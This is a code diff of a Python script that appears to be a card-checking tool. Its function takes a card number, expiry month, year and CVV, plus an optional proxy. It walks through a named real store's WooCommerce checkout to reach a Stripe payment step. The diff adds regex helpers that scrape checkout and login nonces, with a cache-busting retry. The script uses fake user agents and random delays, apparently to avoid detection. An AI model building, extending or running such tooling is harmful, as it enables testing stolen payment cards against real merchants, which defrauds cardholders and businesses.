@@ -3,6 +3,7 @@ import json
 import time
 import random
 import asyncio
+import re
 from urllib.parse import quote_plus
 from fake_useragent import UserAgent
 from datetime import datetime
@@ -19,6 +20,41 @@ def random_delay():
     """Add random delay between requests"""
     delay = DELAY_BETWEEN_REQUESTS + random.uniform(0, DELAY_RANDOM_RANGE)
     time.sleep(delay)
+
+
+def extract_nonce(html, nonce_name):
+    patterns = [
+        rf'name=["\']{re.escape(nonce_name)}["\'][^>]*value=["\']([^"\']+)["\']',
+        rf'"{re.escape(nonce_name)}"\s*:\s*"([^"]+)"',
+        rf'{re.escape(nonce_name)}"\s*:\s*"([^"]+)"',
+        rf'{re.escape(nonce_name)}=([^&"\']+)',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, html, re.IGNORECASE)
+        if match:
+            return match.group(1).strip()
+    return None
+
+
+def get_checkout_nonces(scraper, user_agent):
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'priority': 'u=0, i',
+        'user-agent': user_agent,
+    }
+    checkout_url = 'https://www.balliante.com/store/checkout/'
+    response = scraper.get(checkout_url, headers=headers)
+    html = response.text
+    noncewo = extract_nonce(html, 'woocommerce-process-checkout-nonce')
+    noncelogin = extract_nonce(html, 'woocommerce-login-nonce')
+    if noncewo and noncelogin:
+        return noncewo, noncelogin
+    cache_bust = f"{checkout_url}?nocache={int(time.time())}"
+    response = scraper.get(cache_bust, headers=headers)
+    html = response.text
+    noncewo = noncewo or extract_nonce(html, 'woocommerce-process-checkout-nonce')
+    noncelogin = noncelogin or extract_nonce(html, 'woocommerce-login-nonce')
+    return noncewo, noncelogin
 
 
 def create_stripe_auth(card, mes, ano, cvv, proxy=None):
@@ -126,21 +162,10 @@ def create_stripe_auth(card, mes, ano, cvv, proxy=None):
         random_delay()
 
         # Step 3: Get checkout page
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'priority': 'u=0, i',
-            'user-agent': user_agent,
-        }
-
-        response = scraper.get('https://www.balliante.com/store/checkout/', headers=headers)
+        noncewo, noncelogin = get_checkout_nonces(scraper, user_agent)
         random_delay()
 
-        # Extract nonces
-        html = response.text
-        try:
-            noncewo = html.split('name="woocommerce-process-checkout-nonce"')[1].split('value="')[1].split('"')[0]
-            noncelogin = html.split('name="woocommerce-login-nonce"')[1].split('value="')[1].split('"')[0]
-        except:
+        if not noncewo or not noncelogin:
             return {"status": "error", "response": "Failed to extract checkout nonces"}
 
         # Step 4: Create Stripe payment method
